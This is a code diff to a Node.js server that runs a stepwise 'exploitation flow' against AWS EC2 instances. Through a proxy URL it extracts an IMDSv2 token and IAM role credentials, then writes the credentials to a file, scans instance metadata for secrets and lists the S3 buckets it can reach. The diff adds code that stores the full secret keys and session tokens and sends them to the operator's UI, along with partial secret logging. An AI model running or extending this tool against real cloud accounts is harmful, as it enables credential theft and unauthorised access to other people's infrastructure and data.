@@ -34,6 +34,7 @@ let currentSession = {
   summary: new SessionSummary(),
   proxyUrl: null,
   token: null,
+  credentials: null, // Store extracted credentials
   roles: [],
   permissions: null,
   metadata: {},
@@ -105,6 +106,41 @@ function scanMetadataForSecrets(metadata) {
   return secrets;
 }
 
+// Convert flat metadata paths to tree structure
+function buildMetadataTree(metadata) {
+  const tree = {};
+
+  for (const [path, value] of Object.entries(metadata)) {
+    const parts = path.split('/').filter(p => p);
+    let current = tree;
+
+    for (let i = 0; i < parts.length; i++) {
+      const part = parts[i];
+      const isLast = i === parts.length - 1;
+
+      if (isLast) {
+        // This is a file (leaf node)
+        current[part] = {
+          type: 'file',
+          value: value,
+          path: path
+        };
+      } else {
+        // This is a folder
+        if (!current[part]) {
+          current[part] = {
+            type: 'folder',
+            children: {}
+          };
+        }
+        current = current[part].children;
+      }
+    }
+  }
+
+  return tree;
+}
+
 // Start exploitation flow
 app.post('/api/start', async (req, res) => {
   const { proxyUrl } = req.body;
@@ -173,7 +209,11 @@ app.post('/api/start', async (req, res) => {
     emitLog('success', '✓ IMDSv2 token extracted successfully');
     emitLog('info', `Token TTL: 6 hours (21600 seconds)`);
     emitLog('info', `Token length: ${token.length} characters`);
+    emitLog('info', `Token preview: ${token.substring(0, 50)}...`);
     currentSession.summary.setIMDS({ token, totalMetadata: 0 });
+
+    // Send token to UI
+    io.emit('sessionUpdate', { imdsToken: token });
 
     // Step 3: Enumerate IAM Roles
     emitLog('info', 'Step 3: Enumerating IAM roles...');
@@ -198,13 +238,30 @@ app.post('/api/start', async (req, res) => {
       if (creds) {
         emitLog('success', `✓ Credentials extracted for ${role}`);
         emitLog('info', `Access Key ID: ${creds.AccessKeyId}`);
+        emitLog('info', `Secret Access Key: ${creds.SecretAccessKey.substring(0, 10)}...${creds.SecretAccessKey.substring(creds.SecretAccessKey.length - 4)}`);
+        emitLog('info', `Session Token Length: ${creds.Token.length} characters`);
         emitLog('info', `Expiration: ${creds.Expiration}`);
+
+        // Store credentials in session
+        currentSession.credentials = {
+          roleName: role,
+          accessKeyId: creds.AccessKeyId,
+          secretAccessKey: creds.SecretAccessKey,
+          sessionToken: creds.Token,
+          expiration: creds.Expiration,
+        };
+
         currentSession.summary.addRole({
           name: role,
           accessKeyId: creds.AccessKeyId,
           secretAccessKey: creds.SecretAccessKey,
           token: creds.Token,
           expiration: creds.Expiration,
+        });
+
+        // Send credentials to UI
+        io.emit('sessionUpdate', {
+          credentials: currentSession.credentials
         });
 
         // Write credentials to file
@@ -249,21 +306,30 @@ app.post('/api/start', async (req, res) => {
     // Step 5: Enumerate IMDS metadata
     emitLog('info', 'Step 5: Enumerating IMDS metadata...');
     emitLog('info', 'Recursively crawling /latest/meta-data endpoint...');
+    emitLog('info', 'Building metadata tree structure for better visualization...');
     const metadata = await s3discovery.enumerateIMDSRecursive(proxyUrl, token, '/latest/meta-data');
     const metadataCount = Object.keys(metadata).length;
     emitLog('success', `✓ Discovered ${metadataCount} metadata entries`);
     emitLog('info', 'Metadata includes: instance-id, instance-type, placement, tags, user-data, etc.');
+    emitLog('info', `Sample paths: ${Object.keys(metadata).slice(0, 3).join(', ')}...`);
 
     // Store metadata in session
     currentSession.metadata = metadata;
 
+    // Build tree structure from flat paths
+    emitLog('info', 'Converting metadata to tree structure...');
+    const metadataTree = buildMetadataTree(metadata);
+    emitLog('success', `✓ Metadata tree built with ${Object.keys(metadataTree).length} root nodes`);
+
     // Scan metadata for secrets/credentials
     emitLog('info', 'Scanning metadata for secrets and credentials...');
+    emitLog('info', 'Checking for: AWS keys, private keys, passwords, API tokens, JWTs, URLs with credentials...');
     const metadataSecrets = scanMetadataForSecrets(metadata);
     currentSession.metadataSecrets = metadataSecrets;
     if (metadataSecrets.length > 0) {
       emitLog('warning', `⚠ Found ${metadataSecrets.length} potential secrets/credentials in metadata`);
       emitLog('info', `Secret types: ${[...new Set(metadataSecrets.flatMap(s => s.types))].join(', ')}`);
+      emitLog('info', `Paths with secrets: ${metadataSecrets.map(s => s.path).slice(0, 3).join(', ')}${metadataSecrets.length > 3 ? '...' : ''}`);
     } else {
       emitLog('info', 'No obvious secrets found in metadata');
     }
@@ -292,26 +358,31 @@ app.post('/api/start', async (req, res) => {
       permissions: permResults,
       metadata: metadataCount,
       metadataDetails: metadata,
+      metadataTree: metadataTree,
       metadataSecrets: metadataSecrets,
     });
 
     // Step 7: Test S3 access
     emitLog('info', 'Step 7: Testing S3 access...');
     emitLog('info', 'Running: aws s3api list-buckets');
+    emitLog('info', 'Checking for s3:ListAllMyBuckets permission...');
     try {
       const s3Results = await s3discovery.testS3Access();
       if (s3Results.buckets && s3Results.buckets.length > 0) {
         emitLog('success', `✓ Found ${s3Results.buckets.length} accessible S3 buckets`);
-        emitLog('info', `S3 buckets: ${s3Results.buckets.join(', ')}`);
+        emitLog('info', `S3 buckets: ${s3Results.buckets.slice(0, 5).join(', ')}${s3Results.buckets.length > 5 ? ` and ${s3Results.buckets.length - 5} more...` : ''}`);
+        emitLog('info', 'You can now explore these buckets in the UI');
         io.emit('sessionUpdate', {
           s3Buckets: s3Results.buckets,
         });
       } else {
         emitLog('info', 'No S3 buckets found or no s3:ListAllMyBuckets permission');
+        emitLog('info', 'This is normal if the role does not have S3 permissions');
       }
     } catch (error) {
       emitLog('warning', '⚠ S3 access test failed');
       emitLog('info', `Error: ${error.message}`);
+      emitLog('info', 'This may indicate missing S3 permissions or network issues');
     }
 
     emitLog('success', '✓ Exploitation complete! All steps finished successfully.');
